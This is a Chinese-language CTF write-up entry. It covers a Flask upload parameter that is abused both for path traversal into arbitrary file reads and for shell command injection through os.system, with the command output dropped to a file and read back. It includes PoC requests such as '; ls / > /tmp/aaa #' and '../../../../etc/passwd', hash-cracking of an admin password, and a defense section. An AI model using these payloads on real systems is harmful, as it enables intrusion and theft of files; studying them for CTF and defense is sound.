---
id: ctf-web-file-path-cmdinj-output-drop-arbitread
title: 上传路径参数双重滥用：拼接 open 任意文件读取源码，os.system base64 命令注入输出落盘后再读取回读
type: scenario
domain: ctf
path: ctf/web
technique: file-path-cmdinj-output-drop-arbitread
aliases:
- 盲命令注入落盘回读
- os.system 命令注入
- 上传路径任意文件读取
- base64 命令注入
- 命令输出写文件取回
tags:
- ctf
- web
- command-injection
- arbitrary-file-read
- path-traversal
- flask
- python
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

## 一句话结论

Flask 上传页把 `file_path` 参数同时用于 `open('./uploads/' + file_path)` 与 `os.system(f'base64 {file_path} > /tmp/{file_path}.b64')` 两处：普通用户分支可用 `../` 路径穿越任意文件读取（读出源码），admin 分支的 shell 拼接造成命令注入，把命令输出重定向到磁盘文件后，再用同一任意文件读取把结果取回，形成无回显命令注入的完整取数链。

## 原理

- **任意文件读取**：`open('./uploads/' + request.args.get('file_path'))` 直接拼接用户输入，未做目录约束与 `..` 过滤，传入 `../../../../etc/passwd` 即可读取任意文件；先读 `/proc/self/cwd` 附近的 `app.py` 等源码定位后续漏洞点。
- **命令注入**：admin 分支执行 `os.system(f'base64 {file_path} > /tmp/{file_path}.b64')`，`file_path` 未做任何 shell 转义；用 `;` 截断前缀命令即可注入任意命令，结尾用 `#` 注释掉拼接残段。
- **盲注取数**：命令执行无回显，但注入的命令可以把输出重定向到磁盘任意路径（如 `/tmp/aaa` 或 web 可达目录），再借同一处任意文件读取把落盘结果读回来；本题甚至可直接穿越读取 `/Fl4g_is_H3r3`。
- 管理员口令为源码内 SHA256 常量，弱口令可被彩虹表/在线库直接还原（本题解出 `backdoor`），说明硬编码哈希口令弱于加盐慢哈希。

## 触发条件

1. 服务端把同一用户可控参数拼进文件打开路径（无目录穿越过滤）；
2. 同一参数或另一参数被拼进 `os.system`/`os.popen`/`subprocess(shell=True)` 等 shell 命令且未转义；
3. 命令执行分支有权限差异时（如仅 admin），需先取得对应身份（源码泄露的口令哈希、弱口令等）。

## 利用步骤

1. 用路径穿越读源码：`/upload?file_path=../app.py`，分析文件保存与处理逻辑；
2. 从源码取出管理口令哈希（SHA256），查库还原明文登录 admin；
3. 注入命令并落盘：`file_path=; ls / > /tmp/aaa #`，使 `os.system` 执行 `ls /` 并把结果写入 `/tmp/aaa`；
4. 用任意文件读取回读 `/tmp/aaa` 定位 flag 文件名；
5. 直接穿越读取 flag：`/upload?file_path=../../../../Fl4g_is_H3r3`。

## PoC

```
GET /upload?file_path=; ls / > /tmp/aaa #        # admin 会话，命令注入落盘
GET /upload?file_path=../..\tmp\aaa              # 任意文件读取回读（Linux 用 ../../tmp/aaa）
GET /upload?file_path=../../../../Fl4g_is_H3r3   # 直接读取 flag
```

## 变体与关联

- 命令输出写到 Web 静态目录（如 `cp /flag static/1`）再用 HTTP 直接下载，等价于本题另一变体（配合 SSTI 链使用）；
- 无文件读取原语时，盲命令注入可改用 curl/wget 外带或 sleep 时间盲注；
- 与"上传文件名拼进保存路径"类漏洞同源：上传/下载参数同时进入 open 与 shell 是常见复合漏洞模式。

## 检测与防御

- 检测：审计所有把请求参数拼进 `open()`、`os.system`、`subprocess` 的代码点；fuzz `../` 与 `; | & $( ) #` 元字符；
- 防御：文件路径用白名单目录拼接并 `os.path.realpath` 校验前缀；命令调用改用参数数组 `subprocess.run([...], shell=False)`，禁止字符串拼接；管理口令改用加盐慢哈希而非源码内 SHA256 常量。
